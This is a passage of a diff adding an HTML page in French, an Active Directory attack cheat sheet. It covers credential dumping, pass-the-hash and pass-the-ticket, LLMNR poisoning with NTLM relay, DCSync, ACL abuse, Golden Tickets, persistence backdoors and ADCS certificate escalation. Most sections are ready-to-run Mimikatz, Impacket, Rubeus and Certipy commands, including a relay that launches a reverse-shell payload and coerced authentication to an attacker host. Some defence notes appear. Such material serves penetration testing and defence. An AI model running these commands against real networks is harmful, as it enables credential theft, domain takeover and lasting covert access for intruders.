+<span class="cmd">sekurlsa::logonpasswords</span>              <span class="cm"># dump tout — passwords + hashes</span>
+<span class="cmd">sekurlsa::msv</span>                         <span class="cm"># hashes NT uniquement</span>
+
+<span class="cm"># SAM dump (comptes locaux)</span>
+<span class="cmd">crackmapexec smb 10.10.10.10 -u admin -p Pass123 --sam</span>
+<span class="cmd">impacket-secretsdump corp.local/admin:Pass123@10.10.10.10 --sam</span>
+
+<span class="cm">## 2. Utiliser les hashes (format user:rid:LM:NT:::)</span>
+
+<span class="cm"># Impacket — psexec (crée un service = bruyant)</span>
+<span class="cmd">impacket-psexec corp.local/Administrator@10.10.10.10 -hashes aad3b435b51404ee:32196b56ffe6f45e</span>
+
+<span class="cm"># Impacket — wmiexec (plus discret)</span>
+<span class="cmd">impacket-wmiexec corp.local/Administrator@10.10.10.10 -hashes :32196b56ffe6f45e</span>
+
+<span class="cm"># Impacket — smbexec</span>
+<span class="cmd">impacket-smbexec corp.local/Administrator@10.10.10.10 -hashes :32196b56ffe6f45e</span>
+
+<span class="cm"># evil-winrm</span>
+<span class="cmd">evil-winrm -i 10.10.10.10 -u Administrator -H 32196b56ffe6f45e</span>
+
+<span class="cm"># CrackMapExec — spray PTH sur tout le réseau</span>
+<span class="cmd">crackmapexec smb 10.10.10.0/24 -u Administrator -H 32196b56ffe6f45e</span>
+<span class="cm"># "Pwn3d!" → admin local sur cette machine</span>
+
+<span class="cm"># Mimikatz — PTH pour ouvrir un processus</span>
+<span class="cmd">sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:32196b56ffe6f45e /run:cmd.exe</span></pre>
+
+  <h3>Défenses</h3>
+  <ul>
+    <li><span class="ok">Windows Credential Guard</span> — virtualise LSASS, bloque Mimikatz sekurlsa</li>
+    <li><span class="ok">LAPS</span> (Local Administrator Password Solution) — passwords admin locaux aléatoires uniques</li>
+    <li><span class="ok">Protected Users group</span> — interdit l'auth NTLM, Kerberos RC4, délégation</li>
+    <li>Désactiver NTLM (Kerberos uniquement) via GPO</li>
+    <li>Tier model (Admin Tier 0/1/2) — isolation des comptes admin</li>
+  </ul>
+</section>
+
+<!-- 07 PTT -->
+<section class="section" id="ptt">
+  <div class="section-header"><span class="snum">07</span><h2>Pass-the-Ticket &amp; Overpass-the-Hash</h2><span class="badge br">HIGH</span><span class="mitre">T1550.003</span></div>
+  <pre><span class="cm">## Pass-the-Ticket — voler et réutiliser un ticket Kerberos</span>
+
+<span class="cm"># Lister et exporter les tickets</span>
+<span class="cmd">klist</span>                                  <span class="cm"># voir les tickets du user courant</span>
+<span class="cmd">.\Rubeus.exe dump /nowrap</span>             <span class="cm"># dump tous les tickets base64</span>
+<span class="cmd">mimikatz# sekurlsa::tickets /export</span>  <span class="cm"># export .kirbi files</span>
+
+<span class="cm"># Importer un ticket volé</span>
+<span class="cmd">.\Rubeus.exe ptt /ticket:base64_or_file.kirbi</span>
+<span class="cmd">mimikatz# kerberos::ptt ticket.kirbi</span>
+<span class="cmd">export KRB5CCNAME=stolen.ccache  # Linux (Impacket)</span>
+
+<span class="cm">## Overpass-the-Hash — NT hash → TGT Kerberos (+ discret que PTH)</span>
+<span class="cmd">.\Rubeus.exe asktgt /user:Administrator /rc4:NT_HASH /ptt</span>
+<span class="cmd">.\Rubeus.exe asktgt /user:Administrator /aes256:AES_HASH /ptt /opsec</span>
+<span class="cmd">mimikatz# sekurlsa::pth /user:Admin /domain:corp.local /ntlm:HASH /run:powershell.exe</span>
+
+<span class="cm">## Résumé comparatif</span>
+<span class="cm">PTH  → auth NTLM  → NT hash direct           → EventID 4624 Type 3 NTLM</span>
+<span class="cm">PTT  → auth Kerb  → ticket volé              → trafic Kerberos normal, discret</span>
+<span class="cm">OPtH → auth Kerb  → NT hash → TGT → Kerb    → le plus discret des 3</span></pre>
+</section>
+
+<!-- 08 LLMNR -->
+<section class="section" id="llmnr">
+  <div class="section-header"><span class="snum">08</span><h2>LLMNR Poisoning &amp; NTLM Relay</h2><span class="badge br">CRITIQUE · RÉSEAU</span><span class="mitre">T1557.001</span></div>
+  <div class="card cc"><p><strong>LLMNR / NBT-NS</strong> sont des protocoles de fallback DNS qui broadcastent sur le LAN quand le DNS échoue. Responder se positionne comme Man-in-the-Middle pour capturer les authentifications NTLM automatiques des victimes.</p></div>
+
+  <h3>Phase 1 — Capture avec Responder</h3>
+  <pre><span class="cm">## Lancer Responder (empoisonne LLMNR, NBT-NS, mDNS)</span>
+<span class="cmd">sudo responder -I eth0 -v</span>
+<span class="cmd">sudo responder -I eth0 -rdwv</span>  <span class="cm"># + WPAD, DHCPv6</span>
+
+<span class="cm"># Victimes capturées automatiquement quand elles accèdent à \\partage_inexistant</span>
+<span class="cm"># Logs : /usr/share/responder/logs/SMB-NTLMv2-SSP-10.10.10.x.txt</span>
+
+<span class="cm">## Cracker les NTLMv2 capturés</span>
+<span class="cmd">hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt</span></pre>
+
+  <h3>Phase 2 — NTLM Relay (si SMB signing désactivé)</h3>
+  <pre><span class="cm">## Vérifier SMB signing sur le réseau</span>
+<span class="cmd">crackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt</span>
+<span class="cmd">nmap --script smb2-security-mode -p445 10.10.10.0/24</span>
+
+<span class="cm">## Setup : désactiver SMB/HTTP dans Responder (ntlmrelayx prend le relais)</span>
+<span class="cmd">sudo sed -i 's/SMB = On/SMB = Off/;s/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf</span>
+
+<span class="cm">## ntlmrelayx — dump SAM des cibles</span>
+<span class="cmd">sudo impacket-ntlmrelayx -tf targets.txt -smb2support</span>
+
+<span class="cm">## ntlmrelayx — shell interactif sur la cible</span>
+<span class="cmd">sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i</span>
+
+<span class="cm">## ntlmrelayx — exécuter une commande (reverse shell)</span>
+<span class="cmd">sudo impacket-ntlmrelayx -tf targets.txt -smb2support -c "powershell -e BASE64_REVSHELL"</span>
+
+<span class="cm">## Responder en parallèle pour le poisoning</span>
+<span class="cmd">sudo responder -I eth0 -v</span></pre>
+
+  <h3>Défenses</h3>
+  <ul>
+    <li><span class="ok">Désactiver LLMNR</span> via GPO : Computer Configuration → Administrative Templates → Network → DNS Client → Turn Off Multicast Name Resolution</li>
+    <li><span class="ok">Désactiver NBT-NS</span> via DHCP options ou WMI sur toutes les interfaces</li>
+    <li><span class="ok">SMB Signing obligatoire</span> sur tous les serveurs — bloque le relay</li>
+    <li>Extended Protection for Authentication (EPA) pour HTTP</li>
+    <li>Alerter sur EventID 4648 (logon explicite inhabituel)</li>
+  </ul>
+</section>
+
+<!-- 09 LATERAL -->
+<section class="section" id="lateral">
+  <div class="section-header"><span class="snum">09</span><h2>Mouvement Latéral</h2><span class="badge br">HIGH</span><span class="mitre">T1021</span></div>
+  <div class="tw"><table>
+    <tr><th>Technique</th><th>Port</th><th>Outil</th><th>Discrétion</th><th>Event ID</th></tr>
+    <tr><td>PsExec (service SMB)</td><td>445</td><td>psexec, PsExec.exe</td><td>🔴 Bruyant</td><td>7045, 4697</td></tr>
+    <tr><td>WMI Exec</td><td>135</td><td>wmiexec, CrackMapExec</td><td>🟠 Moyen</td><td>4688</td></tr>
+    <tr><td>WinRM / evil-winrm</td><td>5985</td><td>evil-winrm, Enter-PSSession</td><td>🟡 Discret</td><td>4688</td></tr>
+    <tr><td>DCOM Exec</td><td>135</td><td>dcomexec</td><td>🟡 Discret</td><td>4688</td></tr>
+    <tr><td>SMBExec</td><td>445</td><td>smbexec</td><td>🟠 Moyen</td><td>4624</td></tr>
+    <tr><td>RDP</td><td>3389</td><td>xfreerdp, rdesktop</td><td>🔴 Visible</td><td>4624 T10</td></tr>
+    <tr><td>SSH (si activé)</td><td>22</td><td>ssh</td><td>🟡 Normal</td><td>—</td></tr>
+  </table></div>
+
+  <pre><span class="cm">## evil-winrm — le plus polyvalent depuis Linux</span>
+<span class="cmd">evil-winrm -i 10.10.10.10 -u Administrator -p 'Password123'</span>
+<span class="cmd">evil-winrm -i 10.10.10.10 -u Administrator -H 32196b56ffe6f45e294117b91a83bf38</span>
+<span class="cmd">evil-winrm -i 10.10.10.10 -u Administrator -p 'Pass' -s /path/to/ps-scripts/</span>
+
+<span class="cm">## CrackMapExec / NetExec</span>
+<span class="cmd">crackmapexec smb 10.10.10.10 -u john -p Pass123 -x "whoami /all"</span>   <span class="cm"># cmd</span>
+<span class="cmd">crackmapexec smb 10.10.10.10 -u john -p Pass123 -X "Get-Process"</span>    <span class="cm"># PowerShell</span>
+<span class="cmd">crackmapexec winrm 10.10.10.10 -u john -p Pass123 -x "whoami"</span>
+
+<span class="cm">## Impacket — options</span>
+<span class="cmd">impacket-wmiexec corp.local/john:Pass123@10.10.10.10</span>    <span class="cm"># WMI, semi-interactif</span>
+<span class="cmd">impacket-dcomexec corp.local/john:Pass123@10.10.10.10</span>   <span class="cm"># DCOM</span>
+<span class="cmd">impacket-atexec corp.local/john:Pass123@10.10.10.10 "cmd /c whoami"</span>  <span class="cm"># Task Scheduler</span>
+
+<span class="cm">## RDP depuis Linux</span>
+<span class="cmd">xfreerdp /v:10.10.10.10 /u:Administrator /p:Password123 /cert:ignore</span>
+<span class="cmd">xfreerdp /v:10.10.10.10 /u:Administrator /pth:NT_HASH /cert:ignore</span>   <span class="cm"># PTH via RDP</span></pre>
+</section>
+
+<!-- 10 DCSYNC -->
+<section class="section" id="dcsync">
+  <div class="section-header"><span class="snum">10</span><h2>DCSync — Dump total du domaine</h2><span class="badge br">CRITIQUE → DA</span><span class="mitre">T1003.006</span></div>
+  <div class="card cc"><p>DCSync simule un DC secondaire demandant la réplication AD via le protocole MS-DRSR. Un compte avec les droits <strong>DS-Replication-Get-Changes + DS-Replication-Get-Changes-All</strong> extrait tous les hashes NTLM du domaine — sans toucher au fichier NTDS.dit.</p></div>
+
+  <pre><span class="cm">## Avec Mimikatz (Windows — session avec droits DA ou DCSync)</span>
+<span class="cmd">mimikatz# lsadump::dcsync /domain:corp.local /user:Administrator</span>
+<span class="cmd">mimikatz# lsadump::dcsync /domain:corp.local /user:krbtgt</span>     <span class="cm"># pour Golden Ticket!</span>
+<span class="cmd">mimikatz# lsadump::dcsync /domain:corp.local /all /csv</span>         <span class="cm"># dump TOTAL</span>
+
+<span class="cm">## Avec Impacket secretsdump (Linux)</span>
+<span class="cmd">impacket-secretsdump corp.local/Administrator:Pass123@10.10.10.10</span>
+<span class="cmd">impacket-secretsdump corp.local/Administrator@10.10.10.10 -hashes :NT_HASH</span>
+<span class="cmd">impacket-secretsdump -just-dc-user krbtgt corp.local/admin:pass@10.10.10.10</span>
+<span class="cmd">impacket-secretsdump -just-dc-ntlm corp.local/admin:pass@10.10.10.10</span>
+
+<span class="cm">## NTDS.dit extraction directe (accès physique DC)</span>
+<span class="cmd">vssadmin create shadow /for=C:</span>
+<span class="cmd">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\</span>
+<span class="cmd">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\</span>
+<span class="cmd">impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL</span>
+
+<span class="cm">## Droits nécessaires pour DCSync</span>
+<span class="cm">DS-Replication-Get-Changes       → GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2</span>
+<span class="cm">DS-Replication-Get-Changes-All   → GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2</span>
+<span class="cm">Par défaut: Domain Admins, Enterprise Admins, Domain Controllers</span>
+<span class="cm">BloodHound: edge "DCSync" identifie qui a ces droits</span>
+
+<span class="cm">## Détection</span>
+<span class="cm">EventID 4662 : accès aux attributs de réplication (Directory Service)
+  → Object Type: domainDNS + Access: 1131f6aa + Source IP ≠ DC → ALERT!</span></pre>
+</section>
+
+<!-- 11 ACL ABUSE -->
+<section class="section" id="acl">
+  <div class="section-header"><span class="snum">11</span><h2>ACL Abuse — Escalade via droits AD</h2><span class="badge br">CRITIQUE</span><span class="mitre">T1222.001</span></div>
+  <div class="alert al-p"><span class="ai">🎯</span><div>Les ACLs (Access Control Lists) AD définissent qui peut faire quoi sur les objets. Des droits mal configurés permettent l'escalade de privilèges sans jamais exploiter une vulnérabilité logicielle. BloodHound les détecte automatiquement.</div></div>
+
+  <div class="tw"><table>
+    <tr><th>Droit ACL</th><th>Sur quoi</th><th>Exploitation</th></tr>
+    <tr><td><code>GenericAll</code></td><td>User/Group/Computer</td><td>Modifier tout — password reset, add to group, takeover</td></tr>
+    <tr><td><code>GenericWrite</code></td><td>User/Computer</td><td>Modifier des attributs — SPN (Targeted Kerberoasting), scriptPath</td></tr>
+    <tr><td><code>WriteOwner</code></td><td>Tout objet</td><td>Devenir propriétaire → WriteDACL → GenericAll</td></tr>
+    <tr><td><code>WriteDACL</code></td><td>Tout objet</td><td>Modifier les ACLs → s'accorder GenericAll</td></tr>
+    <tr><td><code>ForceChangePassword</code></td><td>User</td><td>Changer le mot de passe sans connaître l'ancien</td></tr>
+    <tr><td><code>AddMember</code></td><td>Group</td><td>Ajouter un user au groupe (Domain Admins!)</td></tr>
+    <tr><td><code>AllExtendedRights</code></td><td>User/Domain</td><td>Reset password + DCSync</td></tr>
+    <tr><td><code>Owns</code></td><td>Tout objet</td><td>Propriétaire = contrôle total des ACLs</td></tr>
+  </table></div>
+
+  <pre><span class="cm">## Exploitation avec PowerView</span>
+
+<span class="cm"># GenericAll sur un user → reset password</span>
+<span class="cmd">$SecPass = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force</span>
+<span class="cmd">Set-DomainUserPassword -Identity victim_user -AccountPassword $SecPass</span>
+
+<span class="cm"># GenericAll sur un group → ajouter son user</span>
+<span class="cmd">Add-DomainGroupMember -Identity "Domain Admins" -Members john</span>
+
+<span class="cm"># WriteDACL → s'accorder DCSync rights</span>
+<span class="cmd">Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity john -Rights DCSync</span>
+
+<span class="cm"># GenericWrite sur computer → Resource-Based Constrained Delegation</span>
+<span class="cm"># (→ RBCD attack → impersonation de n'importe quel user sur cette machine)</span>
+<span class="cmd">Set-DomainObject -Identity target_computer -Set @{msds-allowedtoactonbehalfofotheridentity=$AttackerSD}</span>
+
+<span class="cm"># ForceChangePassword</span>
+<span class="cmd">Set-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureString 'P@ss!23' -AsPlainText -Force) -Verbose</span>
+
+<span class="cm">## Targeted Kerberoasting (GenericWrite → SPN)</span>
+<span class="cm"># Ajouter un SPN au compte cible → le rendre Kerberoastable</span>
+<span class="cmd">Set-DomainObject -Identity target_user -Set @{serviceprincipalname='nonexistent/BLAH'}</span>
+<span class="cmd">Get-DomainUser target_user | Get-DomainSPNTicket -Format Hashcat</span>
+<span class="cmd">Set-DomainObject -Identity target_user -Clear serviceprincipalname</span>  <span class="cm"># nettoyage</span></pre>
+</section>
+
+<!-- 12 GOLDEN TICKET -->
+<section class="section" id="golden">
+  <div class="section-header"><span class="snum">12</span><h2>Golden Ticket &amp; Silver Ticket</h2><span class="badge br">CRITIQUE · PERSISTANCE</span><span class="mitre">T1558.001/002</span></div>
+
+  <div class="g2">
+    <div class="card cc"><h4>🥇 Golden Ticket</h4><p>TGT forgé signé avec le hash NT de <code>krbtgt</code>. Permet de s'authentifier comme <em>n'importe quel utilisateur</em> du domaine. Valide jusqu'à 10 ans. <span class="dt">Persistance totale tant que krbtgt n'est pas changé 2x.</span></p></div>
+    <div class="card ch"><h4>🥈 Silver Ticket</h4><p>TGS forgé pour un service spécifique, signé avec le hash du compte de service. Plus discret (pas de contact KDC). Accès limité à un service, mais <span class="wt">aucun contact DC → difficile à détecter.</span></p></div>
+  </div>
+
+  <pre><span class="cm">## PRÉ-REQUIS Golden Ticket : hash NT du compte krbtgt</span>
+<span class="cmd">impacket-secretsdump -just-dc-user krbtgt corp.local/admin:pass@10.10.10.10</span>
+<span class="cm"># Obtenir aussi le SID du domaine</span>
+<span class="cmd">impacket-lookupsid corp.local/admin:pass@10.10.10.10 | grep "Domain SID"</span>
+<span class="cmd">Get-DomainSID  # PowerView</span>
+
+<span class="cm">## Créer le Golden Ticket — Mimikatz</span>
+<span class="cmd">mimikatz# kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-XXX-YYY-ZZZ /krbtgt:KRBTGT_NT_HASH /ptt</span>
+<span class="cm"># /ptt = injecter en mémoire | /ticket = sauvegarder en .kirbi</span>
+<span class="cm"># /groups:512 = Domain Admins (optionnel, inclus par défaut)</span>
+
+<span class="cm">## Créer le Golden Ticket — Impacket ticketer (Linux)</span>
+<span class="cmd">impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXX -domain corp.local FakeAdmin</span>
+<span class="cmd">export KRB5CCNAME=FakeAdmin.ccache</span>
+<span class="cmd">impacket-psexec -k -no-pass corp.local/FakeAdmin@dc01.corp.local</span>
+
+<span class="cm">## Silver Ticket — exemple pour CIFS (file shares)</span>
+<span class="cmd">mimikatz# kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXX /target:server01.corp.local /service:cifs /rc4:SERVICE_NT_HASH /ptt</span>
+
+<span class="cm">## Silver Ticket — services courants</span>
+<span class="cm">cifs   → accès aux partages SMB</span>
+<span class="cm">host   → création de tâches planifiées</span>
+<span class="cm">http   → accès aux services web IIS (SSRS, etc.)</span>
+<span class="cm">mssql  → accès aux bases SQL Server</span>
+<span class="cm">ldap   → accès LDAP (pour DCSync!)</span>
+
+<span class="cm">## Défense : Diamond Ticket (détection améliorée)</span>
+<span class="cm">Les Golden Tickets ont un PAC forgé → certains détecteurs le voient.
+Diamond Tickets modifient un TGT légitime → beaucoup plus difficile à détecter.</span></pre>
+</section>
+
+<!-- 13 PERSISTANCE -->
+<section class="section" id="persist">
+  <div class="section-header"><span class="snum">13</span><h2>Persistance Active Directory</h2><span class="badge br">CRITIQUE</span><span class="mitre">T1098</span></div>
+
+  <div class="tw"><table>
+    <tr><th>Technique</th><th>Prérequis</th><th>Discrétion</th><th>Résilience</th></tr>
+    <tr><td><strong>Golden Ticket</strong></td><td>krbtgt hash</td><td>🟡 Détectable</td><td>Jusqu'à 2x rotation krbtgt</td></tr>
+    <tr><td><strong>Silver Ticket</strong></td><td>Service NT hash</td><td>🟢 Très discret</td><td>Jusqu'à reset service account</td></tr>
+    <tr><td><strong>Diamond Ticket</strong></td><td>krbtgt + DA</td><td>🟢 Difficile à détecter</td><td>Jusqu'à 2x rotation krbtgt</td></tr>
+    <tr><td><strong>Skeleton Key</strong></td><td>DA / LSASS patching</td><td>🔴 Bruyant</td><td>Jusqu'au reboot du DC</td></tr>
+    <tr><td><strong>AdminSDHolder</strong></td><td>DA</td><td>🟡 Subtil</td><td>Permanente si non nettoyé</td></tr>
+    <tr><td><strong>DCSync rights</strong></td><td>DA / WriteDACL</td><td>🟢 Discret</td><td>Permanente si non révoquée</td></tr>
+    <tr><td><strong>SIDHistory</strong></td><td>DA</td><td>🟡 Subtil</td><td>Permanente si non nettoyée</td></tr>
+    <tr><td><strong>DSRM backdoor</strong></td><td>DC access</td><td>🟢 Très discret</td><td>Permanente</td></tr>
+  </table></div>
+
+  <pre><span class="cm">## AdminSDHolder — persistance via ACL sur un objet protégé</span>
+<span class="cm"># AdminSDHolder est le template de sécurité pour les groupes privilégiés
+# SDProp (s'exécute toutes les 60 min) copie ses ACLs sur DA, EA, etc.
+# → Si on ajoute nos droits sur AdminSDHolder, ils sont restaurés toutes les 60min!</span>
+<span class="cmd">Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' -PrincipalIdentity john -Rights All</span>
+
+<span class="cm">## DCSync rights persistants (WriteDACL sur le domaine)</span>
+<span class="cmd">Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity john -Rights DCSync</span>
+
+<span class="cm">## DSRM Backdoor (Directory Services Restore Mode)</span>
+<span class="cm"># DSRM = compte admin local du DC pour la recovery
+# Par défaut: DSRM ne peut pas s'authentifier via réseau
+# Modifier la registry → DSRM devient utilisable à distance</span>
+<span class="cmd">New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD</span>
+<span class="cmd">mimikatz# token::elevate</span>
+<span class="cmd">mimikatz# lsadump::sam</span>  <span class="cm"># obtenir le hash DSRM</span>
+<span class="cm"># Puis PTH avec le hash DSRM depuis n'importe où</span>
+
+<span class="cm">## SIDHistory abuse</span>
+<span class="cm"># Ajouter le SID de DA à l'attribut SIDHistory d'un compte ordinaire
+# → ce compte aura les droits DA dans les tickets Kerberos</span>
+<span class="cmd">mimikatz# sid::patch</span>
+<span class="cmd">mimikatz# misc::addsid john_user S-1-5-21-XXX-512</span>  <span class="cm"># 512 = Domain Admins RID</span></pre>
+</section>
+
+<!-- 14 ADCS -->
+<section class="section" id="adcs">
+  <div class="section-header"><span class="snum">14</span><h2>ADCS — Active Directory Certificate Services</h2><span class="badge br">CRITIQUE · ESC1-ESC8</span><span class="mitre">T1649</span></div>
+
+  <div class="alert al-p"><span class="ai">📜</span><div><strong>ADCS</strong> est l'infrastructure PKI de Microsoft intégrée à AD. Les <strong>ESC1-ESC16</strong> (Escalation vectors) ont été documentés par Will Schroeder &amp; Lee Christensen (SpecterOps) dans le whitepaper <em>"Certified Pre-Owned"</em> (2021). Ces attaques permettent d'obtenir des certificats qui s'authentifient comme n'importe quel user — y compris DA.</div></div>
+
+  <h3>Concepts clés ADCS</h3>
+  <pre><span class="cm">CA   = Certificate Authority (serveur ADCS) — gère les certificats
+Template = modèle définissant ce que le certificat peut faire
+SAN  = Subject Alternative Name — à qui le certificat s'applique (UPN, DNS)
+EKU  = Extended Key Usage — usage autorisé (Client Auth, Code Signing...)
+msPKI-Certificate-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT → user contrôle le SAN</span></pre>
+
+  <h3>ESC1 — SAN arbitraire + enrollment utilisateur</h3>
+  <pre><span class="cm">## ESC1 Conditions :
+# 1. Template avec msPKI-Certificate-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT
+# 2. EKU contient Client Authentication (ou Smart Card Login, PKINIT)
+# 3. Enrollment autorisé pour des utilisateurs non-admins
+
+## Exploitation — Certipy (Linux)</span>
+<span class="cm"># Trouver les templates vulnérables</span>
+<span class="cmd">certipy find -u john@corp.local -p Pass123 -dc-ip 10.10.10.10</span>
+<span class="cmd">certipy find -u john@corp.local -p Pass123 -dc-ip 10.10.10.10 -vulnerable -stdout</span>
+
+<span class="cm"># Demander un certificat en se faisant passer pour Administrator (ESC1)</span>
+<span class="cmd">certipy req -u john@corp.local -p Pass123 -dc-ip 10.10.10.10 -ca CORP-CA -template VulnerableTemplate -upn administrator@corp.local</span>
+
+<span class="cm"># Utiliser le certificat pour obtenir le NT hash de Administrator</span>
+<span class="cmd">certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10</span>
+<span class="cm"># → Retourne le NT hash via PKINIT → Pass-the-Hash vers DA!</span>
+
+<span class="cm">## Exploitation — Certify + Rubeus (Windows)</span>
+<span class="cmd">.\Certify.exe find /vulnerable</span>
+<span class="cmd">.\Certify.exe request /ca:dc01.corp.local\CORP-CA /template:VulnerableTemplate /altname:administrator</span>
+<span class="cmd">.\Rubeus.exe asktgt /user:administrator /certificate:base64cert /password:certpass /ptt</span></pre>
+
+  <h3>ESC2 — Tout EKU ou Any Purpose</h3>
+  <pre><span class="cm">## ESC2 Conditions : EKU = Any Purpose OU aucun EKU (SubCA)
+## L'attaquant peut créer un certificat utilisable pour n'importe quel EKU
+## → peut agir comme un certificat ESC1 ou comme un CA subordonné</span>
+<span class="cmd">certipy req -u john@corp.local -p Pass123 -ca CORP-CA -template ESC2Template -upn administrator@corp.local</span></pre>
+
+  <h3>ESC3 — Enrollment Agent + Template arbitraire</h3>
+  <pre><span class="cm">## ESC3 : 2 templates vulnérables nécessaires
+# Template 1: EKU = Certificate Request Agent (Enrollment Agent)
+# Template 2: autorise l'enrollment agent à s'inscrire pour d'autres users
+
+## Étape 1 : obtenir un certificat Enrollment Agent</span>
+<span class="cmd">certipy req -u john@corp.local -p Pass123 -ca CORP-CA -template EnrollmentAgentTemplate</span>
+<span class="cm"># Étape 2 : demander un certificat au nom d'Administrator</span>
+<span class="cmd">certipy req -u john@corp.local -p Pass123 -ca CORP-CA -template User -on-behalf-of corp\\administrator -pfx enrollment_agent.pfx</span></pre>
+
+  <h3>ESC4 — Droits d'écriture sur un template</h3>
+  <pre><span class="cm">## ESC4 : l'attaquant a des droits GenericWrite/WriteDACL sur un template
+## → Modifier le template pour le rendre ESC1 vulnérable</span>
+<span class="cmd">certipy template -u john@corp.local -p Pass123 -template VictimTemplate -save-old</span>
+<span class="cmd">certipy template -u john@corp.local -p Pass123 -template VictimTemplate -configuration "msPKI-Certificate-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT"</span>
+<span class="cm"># Puis exploiter comme ESC1, puis restaurer</span></pre>
+
+  <h3>ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 flag sur CA</h3>
+  <pre><span class="cm">## ESC6 : flag sur la CA qui permet à n'importe quel template d'avoir un SAN arbitraire
+## Même des templates qui n'ont pas ENROLLEE_SUPPLIES_SUBJECT deviennent ESC1-like
+
+## Vérifier le flag</span>
+<span class="cmd">certutil -config "dc01.corp.local\CORP-CA" -getreg policy\EditFlags</span>
+<span class="cm"># EDITF_ATTRIBUTESUBJECTALTNAME2 = 0x00040000 = vulnérable</span>
+<span class="cmd">certipy req -u john@corp.local -p Pass123 -ca CORP-CA -template User -upn administrator@corp.local</span></pre>
+
+  <h3>ESC8 — NTLM Relay vers ADCS HTTP Enrollment</h3>
+  <pre><span class="cm">## ESC8 : le point d'enrollment ADCS via HTTP (CES) n'a pas de protections
+## → NTLM relay de n'importe quel compte vers /certsrv/certfnsh.asp
+## → Obtenir un certificat pour la machine relayée → PTH ou DCSync
+
+## Conditions : ADCS avec Web Enrollment actif (http://ca/certsrv/)</span>
+
+<span class="cm"># Setup — Certipy relay (Python)</span>
+<span class="cmd">certipy relay -target http://ca.corp.local/certsrv/certfnsh.asp -template DomainController</span>
+<span class="cm"># En parallèle — déclencher une auth NTLM (ex: PetitPotam vers DC)</span>
+<span class="cmd">python3 PetitPotam.py -u john -p Pass123 attacker_ip dc01.corp.local</span>
+<span class="cm"># → Le DC s'authentifie vers notre relay → certificat du DC obtenu
+# → Utiliser le certificat pour DCSync</span>
+<span class="cmd">certipy auth -pfx dc01.pfx -dc-ip 10.10.10.10</span>  <span class="cm"># → NT hash du DC → DCSync</span></pre>
+
+  <h3>Vue d'ensemble ESC1-ESC16</h3>
+  <div class="tw"><table>
+    <tr><th>ESC</th><th>Description</th><th>Impact</th></tr>
+    <tr><td>ESC1</td><td>ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU</td><td>DA via SAN arbitraire</td></tr>
+    <tr><td>ESC2</td><td>Any Purpose EKU / SubCA</td><td>DA — usage universel du cert</td></tr>
+    <tr><td>ESC3</td><td>Enrollment Agent abuse</td><td>DA — demande cert pour n'importe qui</td></tr>
+    <tr><td>ESC4</td><td>Write access sur template vulnérable</td><td>DA — modifier template → ESC1</td></tr>
+    <tr><td>ESC5</td><td>Write access sur PKI Objects dans AD</td><td>DA — modifier objets PKI</td></tr>
+    <tr><td>ESC6</td><td>EDITF_ATTRIBUTESUBJECTALTNAME2 sur CA</td><td>DA — SAN arbitraire global</td></tr>
+    <tr><td>ESC7</td><td>Write access sur la CA elle-même</td><td>DA — contrôle total de la PKI</td></tr>
+    <tr><td>ESC8</td><td>NTLM Relay → Web Enrollment ADCS</td><td>DA — relay DC → cert DC → DCSync</td></tr>
+    <tr><td>ESC9-16</td><td>Attaques avancées (shadow credentials, PFX theft, relay variations)</td><td>Escalade vers DA</td></tr>
+  </table></div>
+
+  <h3>Défenses ADCS</h3>
+  <ul>
+    <li><span class="ok">Certipy / Certify audit</span> — scanner régulièrement les templates vulnérables</li>
+    <li>Désactiver le flag <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code></li>
+    <li>Activer HTTPS + EPA sur les endpoints Web Enrollment</li>
+    <li>Auditer les permissions sur les templates CA</li>
+    <li>Désactiver <code>ENROLLEE_SUPPLIES_SUBJECT</code> sur tous les templates non nécessaires</li>
+    <li>Microsoft: KB5014754 (mai 2022) — renforce la validation des certs Kerberos</li>
+  </ul>
+</section>
+
+<!-- 15 DEFENSE -->
+<section class="section" id="defense">
+  <div class="section-header"><span class="snum">15</span><h2>Hardening &amp; Détection AD</h2><span class="badge bg">DÉFENSE</span></div>
+
+  <h3>Mesures de hardening prioritaires</h3>
+  <div class="g2">
+    <div class="card cg"><h4>✅ Microsoft LAPS</h4><p>Passwords admin locaux aléatoires uniques par machine. Bloque la propagation latérale via compte admin local commun. Déployer LAPS v2 (intégré Windows 2019+).</p></div>
+    <div class="card cg"><h4>✅ Credential Guard</h4><p>Virtualise LSASS dans un contexte sécurisé. Bloque l'extraction de credentials via Mimikatz sekurlsa. Requis: UEFI + Secure Boot + Hyper-V.</p></div>
+    <div class="card cg"><h4>✅ Protected Users Group</h4><p>Interdit : NTLM, RC4, Kerberos délégation, credentials en cache. Ajouter tous les comptes admin dans ce groupe.</p></div>
+    <div class="card cg"><h4>✅ Tiered Admin Model</h4><p>Tier 0 (DC/CA), Tier 1 (servers), Tier 2 (workstations). Comptes séparés par tier. Empêche la latéralité entre tiers.</p></div>
